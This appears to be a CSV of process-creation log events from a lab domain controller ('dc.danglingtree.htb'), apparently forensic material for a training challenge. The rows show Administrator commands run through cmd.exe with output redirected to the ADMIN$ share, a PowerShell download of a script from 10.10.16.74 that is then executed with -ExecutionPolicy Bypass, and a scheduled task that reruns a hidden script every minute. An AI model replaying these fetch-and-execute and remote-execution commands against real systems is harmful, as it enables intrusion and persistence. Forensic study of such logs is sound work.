"TimeGenerated","Computer","User","Image","CommandLine","ParentImage","ParentCommandLine","ProcessGuid","ParentProcessGuid"
"11/8/2026, 2:28:44.395636 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","powershell  -ExecutionPolicy Bypass -File DangletreeEvidence.ps1 ","C:\Windows\System32\cmd.exe","cmd.exe /Q /c powershell -ExecutionPolicy Bypass -File DangletreeEvidence.ps1 1> \\127.0.0.1\ADMIN$\__1786458221.6083045 2>&1","7e3eed90-319c-6a7b-f009-000000003200","7e3eed90-319c-6a7b-ee09-000000003200"
"11/8/2026, 2:28:37.885108 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-3195-6a7b-e909-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 2:28:06.255057 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","powershell.exe  DangletreeEvidence.ps1 ","C:\Windows\System32\cmd.exe","cmd.exe /Q /c powershell.exe DangletreeEvidence.ps1 1> \\127.0.0.1\ADMIN$\__1786458221.6083045 2>&1","7e3eed90-3176-6a7b-e509-000000003200","7e3eed90-3176-6a7b-e309-000000003200"
"11/8/2026, 2:27:45.41799 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","powershell  -c ""iwr http://10.10.16.74/DangletreeEvidence.ps1 -OutFile C:\Users\Administrator\Desktop\DangletreeEvidence.ps1"" ","C:\Windows\System32\cmd.exe","cmd.exe /Q /c powershell -c ""iwr http://10.10.16.74/DangletreeEvidence.ps1 -OutFile C:\Users\Administrator\Desktop\DangletreeEvidence.ps1"" 1> \\127.0.0.1\ADMIN$\__1786458221.6083045 2>&1","7e3eed90-3161-6a7b-e009-000000003200","7e3eed90-3161-6a7b-de09-000000003200"
"11/8/2026, 2:27:37.89252 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-3159-6a7b-d909-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 2:26:37.88593 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-311d-6a7b-d309-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 2:25:37.886656 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-30e1-6a7b-cd09-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 2:24:37.886796 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-30a5-6a7b-b709-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 2:23:37.88524 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-3069-6a7b-a409-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
"11/8/2026, 2:22:37.887059 pm","dc.danglingtree.htb","DANGLINGTREE\Administrator","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","""powershell.exe"" -NoProfile -ExecutionPolicy Bypass -File C:\Users\Administrator\Videos\script.ps1","C:\Windows\System32\svchost.exe","C:\WINDOWS\system32\svchost.exe -k netsvcs -p -s Schedule","7e3eed90-302d-6a7b-9e09-000000003200","7e3eed90-f02f-6a7a-2800-000000003200"
